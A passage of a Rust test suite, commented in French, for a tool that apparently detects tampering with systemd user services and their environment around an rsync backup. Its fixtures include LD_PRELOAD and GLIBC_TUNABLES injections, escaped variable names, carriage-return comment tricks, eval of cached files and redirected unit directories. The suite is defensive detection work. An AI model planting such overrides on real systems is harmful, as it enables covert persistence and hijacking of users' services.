        std::fs::write(m.racine.join("usr/bin/rsync"), "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(m.racine.join("usr/bin/rsync"), std::fs::Permissions::from_mode(0o755)).unwrap();
        m.ecrire(
            &format!(".config/systemd/user/{}", crate::sauvegarde::SERVICE),
            "[Service]\nType=oneshot\nExecStart=/usr/bin/rsync -a /home/alice/Documents/charge/ /home/alice/.config/autostart/\n",
        );
        if m.lancements().probleme != Some(Niveau::Eleve) {
            faux.push("unité hostile de S-1 : muette".to_string());
        }
        assert!(
            faux.is_empty(),
            "la forme exacte ne se tait que sans réglages de popt ni complément : {faux:#?}"
        );
    }

    /// La sauvegarde exacte de Vanguard, posée dans une maison d'essai avec un faux env, un faux rsync et un faux
    /// findmnt, à la forme de la 0.95 (`vide` : « env -i ») ou de la 0.94 : la maison et le texte du service.
    fn sauvegarde_d_essai(nom: &str, vide: bool) -> (Maison, String) {
        use std::os::unix::fs::PermissionsExt as _;
        let m = Maison::nouvelle(nom);
        for p in ["env", "rsync", "findmnt"] {
            let f = m.racine.join("usr/bin").join(p);
            std::fs::write(&f, "#!/bin/sh\n").unwrap();
            std::fs::set_permissions(&f, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        std::fs::create_dir_all(m.chemin("Documents")).unwrap();
        std::fs::create_dir_all(m.racine.join("run/media/alice/Mon disque/Sauvegarde-Vanguard/poste")).unwrap();
        m.monter_le_disque(Some("ext4"));
        let (timer, service) = crate::sauvegarde::unites(
            vide.then_some(Path::new("/usr/bin/env")),
            Path::new("/usr/bin/rsync"),
            Some(Path::new("/usr/bin/findmnt")),
            Some("1234-ABCD"),
            Path::new("/run/media/alice/Mon disque"),
            Path::new("/run/media/alice/Mon disque/Sauvegarde-Vanguard/poste"),
            &[std::path::PathBuf::from("/home/alice/Documents")],
            false,
        )
        .unwrap();
        m.ecrire(&format!(".config/systemd/user/{}", crate::sauvegarde::TIMER), &timer);
        m.ecrire(
            &format!(".config/systemd/user/{}", crate::sauvegarde::SERVICE),
            &service,
        );
        (m, service)
    }

    /// F-1 (0.95) : HOME, ou une variable que lisent rsync, findmnt ou le chargeur, posée au gestionnaire de systemd
    /// du compte (environment.d, user.conf et ses compléments, pam_env, uwsm) : la sauvegarde exacte ne se tait plus.
    /// Un fichier de ces dossiers qui ne se lit pas non plus. HOME seulement lu (« $HOME ») ou un nom qui le contient
    /// (XDG_DATA_HOME) ne compte pas.
    #[test]
    fn la_sauvegarde_exacte_ne_se_tait_pas_si_le_gestionnaire_change_son_environnement() {
        // (nom, fichier, texte, levé à la forme de la 0.94, levé à celle de la 0.95 : « env -i » ne garde que ce que
        // lit le chargeur pour env lui-même).
        let cas: &[(&str, &str, &str, bool, bool)] = &[
            (
                "témoin",
                ".config/environment.d/50-x.conf",
                "PATH=$HOME/.local/bin:${HOME}/bin:$PATH\nXDG_DATA_HOME=/home/alice/.d\n# HOME=/x\n",
                false,
                false,
            ),
            ("masqué", ".config/environment.d/50-x.conf", "", false, false),
            (
                "environment.d",
                ".config/environment.d/50-x.conf",
                "HOME=/home/alice/.cache/x\n",
                true,
                false,
            ),
            (
                "environment.d, blancs",
                ".config/environment.d/50-x.conf",
                "  HOME = /home/alice/.cache/x\n",
                true,
                false,
            ),
            (
                "environment.d, suite",
                ".config/environment.d/50-x.conf",
                "A=1\\\nHOME=/x\n",
                true,
                false,
            ),
            (
                "environment.d, LD_",
                ".config/environment.d/50-x.conf",
                "LD_LIBRARY_PATH=/opt/x/lib\n",
                true,
                true,
            ),
            (
                "environment.d, suite LD_",
                ".config/environment.d/50-x.conf",
                "A=1\\\nLD_\\\nPRELOAD=/x.so\n",
                true,
                true,
            ),
            (
                "environment.d, GLIBC_TUNABLES",
                ".config/environment.d/50-x.conf",
                "GLIBC_TUNABLES=glibc.x=1\n",
                true,
                true,
            ),
            (
                "environment.d, BLKID_FILE",
                ".config/environment.d/50-x.conf",
                "BLKID_FILE=/home/alice/.cache/b\n",
                true,
                false,
            ),
            (
                "user.conf",
                ".config/systemd/user.conf",
                "[Manager]\nDefaultEnvironment=\"A=1\" \"HOME=/x\"\n",
                true,
                true,
            ),
            (
                "user.conf, échappé",
                ".config/systemd/user.conf",
                "[Manager]\nDefaultEnvironment=\"HO\\x4dE=/x\"\n",
                true,
                true,
            ),
            (
                "user.conf, LD_ échappé",
                ".config/systemd/user.conf",
                "[Manager]\nDefaultEnvironment=\"\\x4cD_PRELOAD=/x.so\"\n",
                true,
                true,
            ),
            (
                "user.conf.d",
                ".config/systemd/user.conf.d/x.conf",
                "[Manager]\nManagerEnvironment=LIBMOUNT_FSTAB=/x\n",
                true,
                false,
            ),
            ("pam_environment", ".pam_environment", "HOME OVERRIDE=/x\n", true, true),
            // L-1 (campagne 0.95, angle lecture) : systemd coupe aussi sur un retour chariot seul, le « # » ne
            // commente que jusque-là.
            (
                "environment.d, retour chariot",
                ".config/environment.d/50-x.conf",
                "#x\rLD_PRELOAD=/x.so\n",
                true,
                true,
            ),
            (
                "user.conf, retour chariot",
                ".config/systemd/user.conf",
                "[Manager]\n#n\rDefaultEnvironment=HOME=/x\n",
                true,
                true,
            ),
            (
                "pam_environment, retour chariot",
                ".pam_environment",
                "#n\rHOME OVERRIDE=/x\n",
                true,
                true,
            ),
            // Le shell ne coupe pas là : la ligne d'uwsm reste un commentaire.
            (
                "témoin : uwsm, retour chariot",
                ".config/uwsm/env",
                "#x\rexport HOME=/x\n",
                false,
                false,
            ),
            ("uwsm", ".config/uwsm/env", "export RSYNC_OLD_ARGS=1\n", true, false),
            (
                "uwsm-hyprland",
                ".config/uwsm/env-hyprland",
                "export POPT_X=1\n",
                true,
                false,
            ),
            ("système", "/etc/environment.d/60-x.conf", "HOME=/x\n", true, false),
            ("/etc/environment", "/etc/environment", "HOME=/x\n", true, true),
            ("illisible", ".config/environment.d/50-x.conf", "A=1\n", true, true),
            (
                "dossier illisible",
                ".config/environment.d/50-x.conf",
                "A=1\n",
                true,
                true,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (nom, chemin, texte, ancienne, nouvelle)) in cas.iter().enumerate() {
            for vide in [false, true] {
                let leve = if vide { nouvelle } else { ancienne };
                let (m, service) = sauvegarde_d_essai(&format!("sauvegarde-gestionnaire-{i}-{vide}"), vide);
                let f = if let Some(s) = chemin.strip_prefix('/') {
                    m.racine.join(s)
                } else {
                    m.chemin(chemin)
                };
                std::fs::create_dir_all(f.parent().unwrap()).unwrap();
                if *nom == "masqué" {
                    std::os::unix::fs::symlink("/dev/null", &f).unwrap();
                } else {
                    std::fs::write(&f, texte).unwrap();
                }
                // Sous `unshare -r`, un fichier sans droits se lit quand même : un tube nommé, puis une boucle de liens,
                // ne se lisent jamais.
                if *nom == "illisible" {
                    std::fs::remove_file(&f).unwrap();
                    assert!(
                        std::process::Command::new("/usr/bin/mkfifo")
                            .arg(&f)
                            .status()
                            .unwrap()
                            .success()
                    );
                }
                if *nom == "dossier illisible" {
                    let d = f.parent().unwrap();
                    std::fs::remove_dir_all(d).unwrap();
                    std::os::unix::fs::symlink(d.file_name().unwrap(), d).unwrap();
                }
                let c = m.lancements();
                let execstart = service
                    .lines()
                    .position(|l| l.starts_with("ExecStart="))
                    .map(|n| format!("~/.config/systemd/user/{}:{} : ", crate::sauvegarde::SERVICE, n + 1));
                let nommee = execstart.is_some_and(|e| c.message.contains(&e));
                let juste = if *leve {
                    c.probleme == Some(Niveau::Eleve) && nommee && crate::apprentissage::declarable(&c).is_err()
                } else {
                    // La forme de la 0.94 se dit à part (une information), jamais levée.
                    (vide && c.probleme.is_none())
                        || (!vide && c.probleme == Some(Niveau::Info) && c.message.contains("avant la 0.95"))
                };
                if !juste {
                    faux.push(format!("{nom}, env -i {vide} : {:?} {:?}", c.probleme, c.message));
                }
            }
        }
        assert!(
            faux.is_empty(),
            "l'environnement du gestionnaire change la sauvegarde : {faux:#?}"
        );
    }

    /// V-2 (relecture 0.95) : ~/.config/uwsm/env est un script : une inclusion d'un fichier que Vanguard ne lit pas,
    /// un nom de variable construit (« ${n}LOAD », guillemets dans le nom) ou « eval » cachent ce qu'il pose au
    /// gestionnaire : la sauvegarde se lève, ses deux formes. Tout fichier du dossier uwsm se lit (celui qu'env inclut
    /// aussi) ; une inclusion d'un fichier lu, « export "A=…" » et un PATH qui lit « $HOME » restent muets.
    #[test]
    fn uwsm_qui_inclut_ou_construit_un_nom_leve_la_sauvegarde() {
        const ENV: &str = ".config/uwsm/env";
        // (nom, fichiers posés, levée)
        type Cas<'a> = (&'a str, &'a [(&'a str, &'a str)], bool);
        let cas: &[Cas<'_>] = &[
            (
                "muet",
                &[
                    (
                        ENV,
                        "# réglages\nexport PATH=\"$HOME/bin:$PATH\"\nexport \"EDITOR=nvim\"\nexport ACCUEIL=\"bonjour ; . /tmp/x le monde\" # fin\n[ -f ~/.config/uwsm/default ] && . ~/.config/uwsm/default\nsource \"$HOME/.config/uwsm/default\"\n",
                    ),
                    (".config/uwsm/default", "export TERMINAL=kitty\n"),
                ],
                false,
            ),
            ("inclusion ailleurs", &[(ENV, "source ~/.cache/x/env\n")], true),
            ("inclusion par point", &[(ENV, "true; . /home/alice/.cache/x\n")], true),
            ("inclusion construite", &[(ENV, ". \"$XDG_CACHE_HOME/x\"\n")], true),
            (
                "inclusion lue qui pose",
                &[
                    (ENV, ". ~/.config/uwsm/autre\n"),
                    (".config/uwsm/autre", "export LD_PRELOAD=/home/alice/.cache/x.so\n"),
                ],
                true,
            ),
            ("nom construit", &[(ENV, "n=LD_PRE\nexport ${n}LOAD=/x.so\n")], true),
            (
                "nom entre guillemets",
                &[(ENV, "export GLIBC_\"TUNABLES\"=glibc.x=1\n")],
                true,
            ),
            ("declare construit", &[(ENV, "declare -x \"$n\"=/x.so\n")], true),
            ("eval", &[(ENV, "eval \"$(cat ~/.cache/x)\"\n")], true),
            ("printf -v", &[(ENV, "set -a\nprintf -v \"$n\" %s /x.so\n")], true),
            ("read", &[(ENV, "set -a\nread -r \"$n\" < ~/.cache/x\n")], true),
            ("substitution", &[(ENV, "export $(cat ~/.cache/x)\n")], true),
            // W-2 : les sous-dossiers « env.d » et « env-<bureau>.d », qu'uwsm lit aussi.
            (
                "env.d, chargeur",
                &[(".config/uwsm/env.d/10-x", "export LD_PRELOAD=/home/alice/.cache/x.so\n")],
                true,
            ),
            (
                "env-hyprland.d, eval",
                &[(".config/uwsm/env-hyprland.d/x", "eval \"$(cat ~/.cache/x)\"\n")],
                true,
            ),
            (
                "env.d, nommé environment",
                &[(".config/uwsm/env.d/environment", "eval \"$(cat ~/.cache/x)\"\n")],
                true,
            ),
            (
                "env.d, muet",
                &[
                    (".config/uwsm/env.d/10-x", "export EDITOR=nvim\n"),
                    (".config/uwsm/env-hyprland.d/x", "export TERMINAL=kitty\n"),
                ],
                false,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (nom, fichiers, leve)) in cas.iter().enumerate() {
            for vide in [false, true] {
                let (m, _) = sauvegarde_d_essai(&format!("sauvegarde-uwsm-{i}-{vide}"), vide);
                for (f, texte) in *fichiers {
                    m.ecrire(f, texte);
                }
                let c = m.lancements();
                let juste = if *leve {
                    c.probleme == Some(Niveau::Eleve) && crate::apprentissage::declarable(&c).is_err()
                } else {
                    (vide && c.probleme.is_none())
                        || (!vide && c.probleme == Some(Niveau::Info) && c.message.contains("avant la 0.95"))
                };
                if !juste {
                    faux.push(format!("{nom}, env -i {vide} : {:?} {:?}", c.probleme, c.message));
                }
            }
        }
        assert!(faux.is_empty(), "uwsm et la sauvegarde : {faux:#?}");
    }

    /// V-1 (relecture 0.95) : un fichier du compte (user.conf et user.conf.d, ~/.pam_environment, environment.d) qui
    /// déplace les dossiers où systemd du compte cherche ses unités (XDG_CONFIG_HOME, XDG_CONFIG_DIRS, XDG_DATA_HOME,
    /// XDG_DATA_DIRS, SYSTEMD_UNIT_PATH) : ces dossiers se lisent. Un complément de la sauvegarde posé là la lève, une
    /// unité posée là se lève comme celle d'un dossier ajouté. Une valeur que Vanguard ne résout pas se dit, non
    /// vérifiée, et lève la sauvegarde.
    #[test]
    fn les_dossiers_d_unites_deplaces_par_le_gestionnaire_se_lisent() {
        const REMPLACE: &str = "[Service]\nExecStart=\nExecStart=/usr/bin/rsync -a /home/alice/Documents /tmp/x\n";
        const CONF: &str = ".config/systemd/user.conf";
        let complement = |d: &str| Some(format!("{d}/{}.d/x.conf", crate::sauvegarde::SERVICE));
        // (nom, fichier qui déplace, son texte, complément posé, levée)
        let cas: Vec<(&str, &str, &str, Option<String>, bool)> = vec![
            (
                "données par user.conf",
                CONF,
                "[Manager]\nManagerEnvironment=XDG_DATA_DIRS=/home/alice/.x:/usr/share\n",
                complement(".x/systemd/user"),
                true,
            ),
            (
                "données par user.conf, derrière un retour chariot",
                CONF,
                "[Manager]\n#note\rManagerEnvironment=XDG_DATA_DIRS=/home/alice/.x:/usr/share\n",
                complement(".x/systemd/user"),
                true,
            ),
            (
                "données du compte par environment.d, derrière un retour chariot",
                ".config/environment.d/50-x.conf",
                "#n\rXDG_DATA_HOME=${HOME}/.w\n",
                complement(".w/systemd/user"),
                true,
            ),
            (
                "configuration par user.conf, guillemets",
                CONF,
                "[Manager]\nManagerEnvironment=\"A=1\" \"XDG_CONFIG_HOME=/home/alice/.y\"\n",
                complement(".y/systemd/user"),
                true,
            ),
            (
                "configuration du système par user.conf.d, $HOME",
                ".config/systemd/user.conf.d/x.conf",
                "[Manager]\nManagerEnvironment = XDG_CONFIG_DIRS=$HOME/.z\n",
                complement(".z/systemd/user"),
                true,
            ),
            (
                "configuration par pam_environment",
                ".pam_environment",
                "XDG_CONFIG_HOME DEFAULT=@{HOME}/.y\n",
                complement(".y/systemd/user.control"),
                true,
            ),
            (
                "données du compte par environment.d",
                ".config/environment.d/50-x.conf",
                "XDG_DATA_HOME=${HOME}/.w\n",
                complement(".w/systemd/user"),
                true,
            ),
            (
                "chemin d'unités",
                CONF,
                "[Manager]\nDefaultEnvironment=SYSTEMD_UNIT_PATH=/home/alice/.u:\n",
                complement(".u"),
                true,
            ),
            (
                "non résolue",
                CONF,
                "[Manager]\nManagerEnvironment=XDG_DATA_DIRS=$TRUC/x\n",
                None,
                true,
            ),
            (
                "nom échappé",
                CONF,
                "[Manager]\nManagerEnvironment=\"XDG_DATA_\\x44IRS=/home/alice/.x\"\n",
                None,
                true,
            ),
            (
                "témoin : déplacé, rien de posé",
                CONF,
                "[Manager]\nManagerEnvironment=XDG_DATA_DIRS=/home/alice/.x:$XDG_DATA_DIRS\n",
                None,
                false,
            ),
            (
                "témoin : guillemets, ${HOME}, ~",
                CONF,
                "[Manager]\nManagerEnvironment=\"XDG_DATA_DIRS=${HOME}/.x\" XDG_CONFIG_DIRS=~/.z\n",
                None,
                false,
            ),
            (
                "témoin : pam_env",
                ".pam_environment",
                "XDG_CONFIG_HOME DEFAULT=@{HOME}/.y OVERRIDE=\"/home/alice/.y\"\n",
                None,
                false,
            ),
            (
                "témoin : relatif, ignoré par systemd",
                ".config/environment.d/50-x.conf",
                "XDG_DATA_HOME=relatif/x\n",
                None,
                false,
            ),
            (
                "témoin : complément ailleurs",
                CONF,
                "[Manager]\nManagerEnvironment=XDG_DATA_DIRS=/home/alice/.x\n",
                complement(".v/systemd/user"),
                false,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (nom, fichier, texte, pose, leve)) in cas.iter().enumerate() {
            for vide in [false, true] {
                let (m, service) = sauvegarde_d_essai(&format!("v1-gestionnaire-{i}-{vide}"), vide);
                m.ecrire(fichier, texte);
                if let Some(p) = pose {
                    m.ecrire(p, REMPLACE);
                }
                let c = m.lancements();
                let execstart = service
                    .lines()
                    .position(|l| l.starts_with("ExecStart="))
                    .map(|n| format!("~/.config/systemd/user/{}:{} : ", crate::sauvegarde::SERVICE, n + 1));
                let nommee = execstart.is_some_and(|e| c.message.contains(&e));
                let juste = if *leve {
                    c.probleme == Some(Niveau::Eleve) && nommee && crate::apprentissage::declarable(&c).is_err()
                } else {
                    (vide && c.probleme.is_none())
                        || (!vide && c.probleme == Some(Niveau::Info) && c.message.contains("avant la 0.95"))
                };
                if !juste {
                    faux.push(format!("{nom}, env -i {vide} : {:?} {:?}", c.probleme, c.message));
                }
            }
        }
        assert!(faux.is_empty(), "dossiers d'unités déplacés : {faux:#?}");
        // Une unité quelconque posée dans le dossier déplacé : levée comme celle d'un dossier ajouté.
        let m = Maison::nouvelle("v1-unite");
        m.ecrire(
            CONF,
            "[Manager]\nManagerEnvironment=XDG_DATA_DIRS=/home/alice/.x:/usr/share\n",
        );
        m.ecrire(".x/systemd/user/agent.service", "[Service]\nExecStart=%h/.x/agent\n");
        let c = m.lancements();
        let r = leve_non_declarable(&c, "unité d'un dossier déplacé");
        assert!(c.message.contains("~/.x/systemd/user/agent.service:2"), "{}", c.message);
        assert!(r.contains("lit en plus"), "{r}");
        // Une valeur non résolue : dite, non vérifiée, avec le fichier et la variable.
        let m = Maison::nouvelle("v1-non-resolue");
        m.ecrire(".pam_environment", "XDG_DATA_DIRS DEFAULT=${TRUC}/x\n");
        let c = m.lancements();
        leve_non_declarable(&c, "valeur non résolue");
        assert!(
            c.message.contains("~/.pam_environment")
                && c.message.contains("XDG_DATA_DIRS")
                && c.message.contains("ne résout pas"),
            "{}",
            c.message
        );
        // Témoin : une valeur simple, sans unité posée, ne lève rien.
        let m = Maison::nouvelle("v1-sain");
        m.ecrire(
            CONF,
            "[Manager]\nManagerEnvironment=XDG_DATA_DIRS=/home/alice/.x:/usr/share\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// W-1 (relecture 0.95) : HOME ou XDG_RUNTIME_DIR posés au gestionnaire de systemd du compte déplacent tous ses
    /// dossiers d'unités (scénarios A et B, mesurés sur systemd 262) ; un XDG_CONFIG_HOME posé par
    /// ~/.pam_environment mène à un user.conf qui pose à son tour XDG_DATA_DIRS (scénario C, chaîne à deux niveaux).
    /// La sauvegarde exacte se lève, ses deux formes ; une chaîne trop longue est dite non résolue ; une chaîne courte
    /// sans complément reste muette.
    #[test]
    fn home_runtime_et_chaine_du_gestionnaire_levent_la_sauvegarde() {
        type Cas<'a> = (&'a str, Vec<(&'a str, String)>, Option<String>, bool, &'a [&'a str]);
        const REMPLACE: &str = "[Service]\nExecStart=\nExecStart=/usr/bin/rsync -a /home/alice/Documents /tmp/x\n";
        const CONF: &str = ".config/systemd/user.conf";
        let complement = |d: &str| format!("{d}/{}.d/x.conf", crate::sauvegarde::SERVICE);
        let chaine_c = [
            (
                ".pam_environment",
                "XDG_CONFIG_HOME DEFAULT=/home/alice/.c\n".to_string(),
            ),
            (
                ".c/systemd/user.conf",
                "[Manager]\nManagerEnvironment=XDG_DATA_DIRS=/home/alice/.d:/usr/share\n".to_string(),
            ),
        ];
        let mut longue: Vec<(&str, String)> = Vec::new();
        let noms: Vec<String> = (0..10).map(|i| format!(".c{i}/systemd/user.conf")).collect();
        longue.push((".pam_environment", "XDG_CONFIG_HOME DEFAULT=/home/alice/.c0\n".into()));
        for (i, n) in noms.iter().enumerate() {
            longue.push((
                n.as_str(),
                format!(
                    "[Manager]\nManagerEnvironment=XDG_CONFIG_HOME=/home/alice/.c{}\n",
                    i + 1
                ),
            ));
        }
        // (nom, fichiers posés, complément posé, levée, mots du message)
        let cas: Vec<Cas<'_>> = vec![
            (
                "A : HOME par user.conf",
                vec![(CONF, "[Manager]\nManagerEnvironment=HOME=/home/alice/.autre\n".into())],
                Some(complement(".autre/.config/systemd/user")),
                true,
                &["pose HOME"],
            ),
            (
                "A : HOME par user.conf.d, échappé",
                vec![(
                    ".config/systemd/user.conf.d/x.conf",
                    "[Manager]\nManagerEnvironment=\"HO\\x4dE=/home/alice/.autre\"\n".into(),
                )],
                Some(complement(".autre/.config/systemd/user")),
                true,
                &["HOME"],
            ),
            (
                "A : HOME par pam_environment",
                vec![(".pam_environment", "HOME DEFAULT=/home/alice/.autre\n".into())],
                None,
                true,
                &["pose HOME"],
            ),
            (
                "B : XDG_RUNTIME_DIR",
                vec![(
                    CONF,
                    "[Manager]\nManagerEnvironment=XDG_RUNTIME_DIR=/home/alice/.r\n".into(),
                )],
                Some(complement(".r/systemd/user.control")),
                true,
                &["pose XDG_RUNTIME_DIR"],
            ),
            (
                "générateurs",
                vec![(
                    CONF,
                    "[Manager]\nManagerEnvironment=SYSTEMD_ENVIRONMENT_GENERATOR_PATH=/home/alice/.g\n".into(),
                )],
                None,
                true,
                &["SYSTEMD_ENVIRONMENT_GENERATOR_PATH"],
            ),
            (
                "C : chaîne à deux niveaux",
                chaine_c.to_vec(),
                Some(complement(".d/systemd/user")),
                true,
                &[],
            ),
            (
                "C : témoin, chaîne sans complément",
                chaine_c.to_vec(),
                None,
                false,
                &[],
            ),
            (
                "C : environment.d du dossier déplacé",
                vec![
                    (".pam_environment", "XDG_CONFIG_HOME DEFAULT=/home/alice/.c\n".into()),
                    (
                        ".c/environment.d/50-x.conf",
                        "LD_PRELOAD=/home/alice/.cache/x.so\n".into(),
                    ),
                ],
                None,
                true,
                &[],
            ),
            ("chaîne trop longue", longue.clone(), None, true, &["XDG_CONFIG_HOME"]),
        ];
        let mut faux = Vec::new();
        for (i, (nom, fichiers, pose, leve, mots)) in cas.iter().enumerate() {
            for vide in [false, true] {
                let (m, service) = sauvegarde_d_essai(&format!("w1-gestionnaire-{i}-{vide}"), vide);
                for (f, texte) in fichiers {
                    m.ecrire(f, texte);
                }
                if let Some(p) = pose {
                    m.ecrire(p, REMPLACE);
                }
                let c = m.lancements();
                let execstart = service
                    .lines()
                    .position(|l| l.starts_with("ExecStart="))
                    .map(|n| format!("~/.config/systemd/user/{}:{} : ", crate::sauvegarde::SERVICE, n + 1));
                let nommee = execstart.is_some_and(|e| c.message.contains(&e));
                let juste = if *leve {
                    c.probleme == Some(Niveau::Eleve)
                        && nommee
                        && crate::apprentissage::declarable(&c).is_err()
                        && mots.iter().all(|w| c.message.contains(w))
                } else {
                    (vide && c.probleme.is_none())
                        || (!vide && c.probleme == Some(Niveau::Info) && c.message.contains("avant la 0.95"))
                };
                if !juste {
                    faux.push(format!("{nom}, env -i {vide} : {:?} {:?}", c.probleme, c.message));
                }
            }
        }
        assert!(faux.is_empty(), "HOME, XDG_RUNTIME_DIR, chaîne : {faux:#?}");
        // Sans sauvegarde : HOME posé au gestionnaire se dit, non vérifié.
        let m = Maison::nouvelle("w1-sans-sauvegarde");
        m.ecrire(CONF, "[Manager]\nManagerEnvironment=HOME=/home/alice/.autre\n");
        let c = m.lancements();
        leve_non_declarable(&c, "HOME posé au gestionnaire");
        assert!(
            c.message.contains("~/.config/systemd/user.conf") && c.message.contains("pose HOME"),
            "{}",
            c.message
        );
        // Témoin : environment.d ne change pas l'environnement du gestionnaire, HOME y reste muet à la forme 0.95.
        let (m, _) = sauvegarde_d_essai("w1-environment-d", true);
        m.ecrire(".config/environment.d/50-x.conf", "HOME=/home/alice/.autre\n");
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// X-1 (relecture 0.95) : un dossier de réglages déplacé vers un chemin qui contient « /uwsm/ » garde son
    /// user.conf et ses compléments lus comme réglages de systemd (sondes S4 à S4d de la relecture), comme un dossier
    /// nommé autrement (S4t). X-2 : uwsm lit aussi « uwsm/env… » sous chaque dossier de XDG_DATA_DIRS : un dossier du
    /// compte posé ainsi se lit (S5, S5c), comme par XDG_CONFIG_DIRS (S5b) ; le fichier d'Omarchy sous /usr/share
    /// aussi, muet quand il est sain.
    #[test]
    fn la_sorte_d_un_fichier_vient_de_son_lieu_pas_de_son_chemin() {
        type Cas<'a> = (&'a str, Vec<(&'a str, &'a str)>, Option<String>);
        const REMPLACE: &str = "[Service]\nExecStart=\nExecStart=/usr/bin/rsync -a /home/alice/Documents /tmp/x\n";
        const DONNEES: &str = "[Manager]\nManagerEnvironment=XDG_DATA_DIRS=/home/alice/.d:/usr/share\n";
        let complement = |d: &str| format!("{d}/{}.d/x.conf", crate::sauvegarde::SERVICE);
        // (nom, fichiers posés, complément posé) : tous levés.
        let cas: Vec<Cas<'_>> = vec![
            (
                "S4 : pam, puis user.conf sous « /uwsm/ »",
                vec![
                    (".pam_environment", "XDG_CONFIG_HOME DEFAULT=/home/alice/.u/uwsm\n"),
                    (".u/uwsm/systemd/user.conf", DONNEES),
                ],
                Some(complement(".d/systemd/user")),
            ),
            (
                "S4b : user.conf, puis user.conf sous « /uwsm/ »",
                vec![
                    (
                        ".config/systemd/user.conf",
                        "[Manager]\nManagerEnvironment=XDG_CONFIG_HOME=/home/alice/.u/uwsm\n",
                    ),
                    (".u/uwsm/systemd/user.conf", DONNEES),
                ],
                Some(complement(".d/systemd/user")),
            ),
            (
                "S4c : user.conf.d sous « /uwsm/ »",
                vec![
                    (".pam_environment", "XDG_CONFIG_HOME DEFAULT=/home/alice/.u/uwsm\n"),
                    (".u/uwsm/systemd/user.conf.d/x.conf", DONNEES),
                ],
                Some(complement(".d/systemd/user")),
            ),
            (
                "S4d : HOME sous « /uwsm/ »",
                vec![
                    (".pam_environment", "XDG_CONFIG_HOME DEFAULT=/home/alice/.u/uwsm\n"),
                    (
                        ".u/uwsm/systemd/user.conf",
                        "[Manager]\nManagerEnvironment=HOME=/home/alice/.autre\n",
                    ),
                ],
                Some(complement(".autre/.config/systemd/user")),
            ),
            (
                "S4t : témoin, autre nom",
                vec![
                    (".pam_environment", "XDG_CONFIG_HOME DEFAULT=/home/alice/.u/autre\n"),
                    (".u/autre/systemd/user.conf", DONNEES),
                ],
                Some(complement(".d/systemd/user")),
            ),
            (
                "S5 : uwsm/env sous XDG_DATA_DIRS",
                vec![
                    (
                        ".config/environment.d/50-x.conf",
                        "XDG_DATA_DIRS=/home/alice/.d:/usr/share\n",
                    ),
                    (".d/uwsm/env", "export LD_PRELOAD=/home/alice/.cache/x.so\n"),
                ],
                None,
            ),
            (
                "S5c : uwsm/env.d sous XDG_DATA_DIRS",
                vec![
                    (
                        ".config/environment.d/50-x.conf",
                        "XDG_DATA_DIRS=/home/alice/.d:/usr/share\n",
                    ),
                    (".d/uwsm/env.d/x", "export LD_PRELOAD=/home/alice/.cache/x.so\n"),
                ],
                None,
            ),
            (
                "S5b : uwsm/env sous XDG_CONFIG_DIRS",
                vec![
                    (
                        ".config/environment.d/50-x.conf",
                        "XDG_CONFIG_DIRS=/home/alice/.d:/etc/xdg\n",
                    ),
                    (".d/uwsm/env", "export LD_PRELOAD=/home/alice/.cache/x.so\n"),
                ],
                None,
            ),
            (
                "S5 : user.conf pose XDG_DATA_DIRS, uwsm/env-hyprland",
                vec![
                    (".config/systemd/user.conf", DONNEES),
                    (".d/uwsm/env-hyprland", "export LD_PRELOAD=/home/alice/.cache/x.so\n"),
                ],
                None,
            ),
        ];
        let mut faux = Vec::new();
        for (i, (nom, fichiers, pose)) in cas.iter().enumerate() {
            for vide in [false, true] {
                let (m, service) = sauvegarde_d_essai(&format!("x1-sorte-{i}-{vide}"), vide);
                for (f, texte) in fichiers {
                    m.ecrire(f, texte);
                }
                if let Some(p) = pose {
                    m.ecrire(p, REMPLACE);
                }
                let c = m.lancements();
                let execstart = service
                    .lines()
                    .position(|l| l.starts_with("ExecStart="))
                    .map(|n| format!("~/.config/systemd/user/{}:{} : ", crate::sauvegarde::SERVICE, n + 1));
                let nommee = execstart.is_some_and(|e| c.message.contains(&e));
                if !(c.probleme == Some(Niveau::Eleve) && nommee && crate::apprentissage::declarable(&c).is_err()) {
                    faux.push(format!("{nom}, env -i {vide} : {:?} {:?}", c.probleme, c.message));
                }
            }
        }
        assert!(faux.is_empty(), "sorte par le lieu : {faux:#?}");
        let ecrire_racine = |m: &Maison, relatif: &str, texte: &str| {
            let f = m.racine.join(relatif);
            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
            std::fs::write(f, texte).unwrap();
        };
        // Témoins : le fichier d'uwsm d'Omarchy sous /usr/share, sain (il lit ~/.config/uwsm/default, lu aussi), et un
        // dossier de XDG_DATA_DIRS sans uwsm, restent muets à la forme 0.95.
        let (m, _) = sauvegarde_d_essai("x2-omarchy", true);
        ecrire_racine(
            &m,
            "usr/share/uwsm/env.d/10-omarchy",
            "export TERMINAL=xdg-terminal-exec\n[ -f \"$HOME/.config/uwsm/default\" ] && . \"$HOME/.config/uwsm/default\"\n",
        );
        m.ecrire(".config/uwsm/default", "export EDITOR=nvim\n");
        m.ecrire(
            ".config/environment.d/50-x.conf",
            "XDG_DATA_DIRS=/home/alice/.d:/usr/share\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
        // Le même fichier sous /usr/share qui pose un chargeur : levé.
        let (m, _) = sauvegarde_d_essai("x2-usr-share", true);
        ecrire_racine(&m, "usr/share/uwsm/env.d/10-x", "export LD_PRELOAD=/usr/lib/x.so\n");
        let c = m.lancements();
        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
    }

    /// W-4 (relecture 0.95) : un fichier du système à root seul (snapd) qui complète XDG_DATA_DIRS par
    /// « ${XDG_DATA_DIRS:-…} » ou « ${XDG_DATA_DIRS:+…} » ne lève plus la sauvegarde exacte à chaque bilan : ses
    /// dossiers se lisent, et un complément posé dans l'un d'eux la lève. La même ligne dans un fichier du compte, ou
    /// dans un fichier du système qui n'est pas à root seul, ou une autre forme, restent non résolues, levées.
    #[test]
    fn la_forme_par_defaut_d_un_fichier_a_root_seul_se_lit() {
        const SNAPD: &str = "PATH=$PATH:/snap/bin\nXDG_DATA_DIRS=${XDG_DATA_DIRS:-/usr/local/share:/usr/share}:/var/lib/snapd/desktop\n";
        const ROOT: &str = "/usr/lib/environment.d/990-snapd.conf";
        let complement = format!(
